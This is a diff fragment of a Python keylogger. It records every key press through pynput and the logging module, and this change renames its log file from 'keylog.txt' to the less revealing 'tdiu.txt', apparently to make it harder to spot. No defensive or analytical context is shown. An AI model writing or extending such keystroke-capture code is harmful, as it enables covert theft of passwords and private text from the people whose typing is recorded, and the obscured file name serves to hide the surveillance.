@@ -6,7 +6,7 @@ from pynput.keyboard import Key, Listener
 import logging
 
 # Basic log configuration
-logging.basicConfig(filename="d://keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+logging.basicConfig(filename="d://tdiu.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 def on_press(key):
     logging.info(str(key))
